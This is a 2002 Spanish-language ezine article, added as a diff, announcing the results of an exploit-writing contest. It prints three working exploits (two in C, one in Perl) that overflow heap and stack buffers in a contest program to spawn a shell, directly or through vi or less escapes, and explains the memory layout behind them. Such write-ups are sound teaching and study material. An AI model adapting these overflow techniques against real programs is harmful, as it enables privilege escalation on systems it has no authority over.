@@ -1,0 +1,230 @@
+|-----------------------------------------------------------------------------|
+  [ 7a69#14 ]                                                  [ 21-10-2002 ]
+ \                                                                           /
+  \-------------------------------------------------------------------------/
+   { 2 - Exploit-It                                                }{ Ripe }
+   |-----------------------------------------------------------------------|
+
+   
+
+	No sois muchos los que habeis mandado el exploit para el source 
+vulnerable que publicamos, solo nos han llegado unas 6 soluciones, y 
+ninguna de ellas ha sido, a mi parecer, 100% eficiente. De todos modos, la
+solucion que antes nos llego viene de la mano de RaiSe, uno de los 
+colaboradores de NetSearch, por lo que el es el ganador de este primer
+Exploit-IT. La solucion de RaiSe es la siguiente:
+
+
+---/ raise.c /---
+
+/*
+ *  Coded by NetSearch Staff <staff@netsearch-ezine.com>
+ *
+ *  Forma de uso:
+ *                ./xpripe offset
+ *                (una vez en el vi: !exec /bin/sh)
+ *
+ *  (el programa vulnerable debe estar en el directorio
+ *   actual con nombre 'ripe')
+ *
+ *  El offset deberia tener un valor entre 128 y 160.
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+
+int main(int argc, char *argv[])
+{
+char buf[2048], *p;
+int i, n, offset;
+
+
+if (argc < 2)
+        {
+        fprintf(stderr, "Uso: %s offset\noffset: 128 - 160\n", argv[0]);
+        exit(-1);
+        }
+else
+    offset = atoi(argv[1]);
+
+bzero(buf, sizeof(buf));
+memset(buf, '/', 108);
+strcat(buf, "/bin/vi");
+
+p = buf;
+
+while (*p != 0x00)
+        p++;
+
+n = strlen(buf);
+
+for (i=0; i < (offset - n); i++)
+        *p++ = 0x73;
+
+printf("Xplotando con offset: %d ..\n\n", offset);
+execl("./ripe", "ripe", buf, NULL);
+fprintf(stderr, "Error execl.\n");
+exit(-1);
+
+}
+
+---/ raise.c /---
+
+
+	De este exploit podemos destacar un par de cosas. Primero de todo esta 
+el offset que nos pide, que sera usado para llenar de 's' el buffer a partir de 
+una posicion determinada, realmente no habia ninguna necesidad de usar ningun
+offset para explotar el programa vulnerable, como veremos mas adelante. En
+segundo lugar vemos que RaiSe ejecuta /bin/vi en lugar de /bin/sh. Esta es una
+buena solucion al problema que se presenta cuando ejecutas /bin/sh, pues la 
+ejecucion de /bin/sh, provoca, realmente la ejecucion de "/bin/sh <buffer>", y
+el buffer es "///...///bin/sh", por lo que trata de interpretar el binario
+como si de un script se tratara y no ejecuta nada finalmente. Ejecutando 
+/bin/vi, sin embargo, editaremos el propio binario del vi (recuerda: "/bin/vi 
+///...///bin/vi"), y una vez dentro podremos usar una de las funcionalidades 
+del vi, el caracter de escape "!" que permite la ejecucion de un comando, por
+ejemplo "/bin/sh". Otra solucion a este mismo problema, que nos ha presentado
+mas de un concursante ha sido la ejecucion del propio exploit, obviamente esto
+no lo tenia previsto, pero en el enunciado no se dice que este prohibido :P
+
+	Seguidamente, lo que voy a presentar va a ser mi solucion, que creo es
+la mas eficiente que he visto para el programa vulnerable que presente...
+
+
+---/ vuln1-xpl.c /---
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define BUFFER       128
+#define BHCH           8
+#define EVILBUF_SIZE BUFFER+BHCH+strlen("/bin/sh")
+
+int main() {
+  char *exec_argv[7];
+  unsigned short int *iptr;
+  char *cptr;
+  char evilbuf[EVILBUF_SIZE+1];
+  char ch;
+  int fd;
+  memset(evilbuf, 'A', EVILBUF_SIZE);
+  strncpy(evilbuf, "/tmp/", 5);
+  evilbuf[EVILBUF_SIZE]=0;
+  iptr=(unsigned short int *)&evilbuf[BUFFER+2];
+  (*iptr)=0x0101;
+  cptr=(char *)&evilbuf[BUFFER+BHCH];
+  strncpy(cptr, "/bin/sh", strlen("/bin/sh"));
+  ch=evilbuf[BUFFER+BHCH];
+  evilbuf[BUFFER+BHCH]=0;
+  mkdir(evilbuf, 0777);
+  evilbuf[BUFFER+BHCH]=ch;
+  ch=evilbuf[BUFFER+BHCH+4];
+  evilbuf[BUFFER+BHCH+4]=0;
+  mkdir(evilbuf, 0777);
+  evilbuf[BUFFER+BHCH+4]=ch;
+  fd=open(evilbuf, O_WRONLY|O_CREAT, 0777);
+  write(fd, "/bin/sh\n", 8);
+  close(fd);
+  exec_argv[0]="vuln1";
+  exec_argv[1]=evilbuf;
+  exec_argv[2]="-b";
+  exec_argv[3]="128";
+  exec_argv[4]="-t";
+  exec_argv[5]="P";
+  exec_argv[6]=NULL;
+  printf("Exploting...\n");
+  execve("vuln1", exec_argv, NULL);
+  printf("Something bad!\n");
+}
+
+---/ vuln1-xpl.c /---
+
+
+	Podeis ver que lo que hago es lo siguiente; mandar un buffer de 128
+bytes que contiene lo siguiente "/tmp/AAAA...<0x0101>...AAAA/bin/sh\0",
+dicho buffer desbordara el buffer de destino en la heap area y lograra
+modificar filename, cambiandolo por "/bin/sh", pues en la heap are hay
+lo siguiente antes de hacer el "strncpy(exec_argv[1], argv[1], size);".
+
+
+                               Heap Area
+	                   ----------------
+	                   |   filename   |
+	                   ----------------
+                           |   8 bytes    |
+			   ----------------
+			   | exec_argv[1] |
+			   ----------------
+
+
+	El problema reside en size, que esta seteado a 16 (o cualquier 
+otro valor que podemos asignar nosotros mediante un parametro), es
+el tamaño de exec_argv[1], como se puede ver en la siguiente linea del
+programa vulnerable "exec_argv[1]=(char *)malloc(size);". Pese a todo, si
+miramos unas lineas mas abajo, veremos que hay un strcpy descontrolado
+que escribe en un buffer del stack; "strcpy(bcp, argv[1]);", y en el stack
+tenemos...
+
+                                 Stack
+                            ---------------
+			    |     size    |
+			    ---------------
+			    |     bcp     |
+			    ---------------
+
+
+	...por lo que podemos modificar el valor de size despues de que este
+haya sido usado para reservar memoria para execve. Mi exploit setea size a 128
+y luego le asigna el valor 0x0101, como se puede ver en el buffer que mando.
+El 0x0101 es el valor mas pequeño que puedo poner sin que contenga caracteres
+nules el buffer, por eso uso ese valor, y no otro. En definitiva, que logramos
+que el programa vulnerable ejecute lo siguiente.
+
+
+	  "/bin/sh /tmp/AAAA...<0x0101>...AAAA/bin/sh"
+
+
+	Con lo que logramos un bonito mensaje como el siguiente :)
+
+
+	  /tmp/AAAA...<0x0101>...AAAA/bin/sh: /tmp/AAAA...<0x0101>...AAAA/bin/sh: No such file or directory
+
+
+	Para solucionar esto, lo que hago es crear ese fichero y hacer que 
+/bin/sh lo interprete, lo creo con dicho contenido... "/bin/sh". Otros, como
+Anarion o RaiSe optaron por no ejecutar /bin/sh y ejecutar /bin/vi y /bin/less
+respectivamente. Ya vimos el exploit de RaiSe, veamos el de Anarion, en perl.
+
+
+---/ vuln-perlxpl.pl /---
+
+#!/usr/bin/perl -w
+# Anarion xpl
+use strict;
+use Cwd;
+die <<USAGE unless @ARGV==2;
+Try $0 vuln <program to execute>                       # Pot ser, /bin/less
+USAGE
+
+my $file = $ARGV[1];                                   # Programa a executar
+my $size = chr(30+length $file);                       # Sobrescrivim el size
+my $buffer = "/"x30 . $file;                           # Ens asegurem de ke sigui mes llarg k el printf
+$buffer.= "A" x (130-length($buffer)) . $size ."\0";
+
+print "Executant $ARGV[0] $buffer -b 4 -t P\n";
+print "\$buffer = ${\length $buffer}\n";
+exec(getcwd()."/$ARGV[0]",$buffer,"-b 4","-t P");
+
+---/ vuln-perlxpl.pl /---
+
+
+	Debido a la poca participacion (solo hemos recibido 5 soluciones) hemos
+decidido suprimir, al menos temporalmente esta seccion.
+
+
+*EOF*
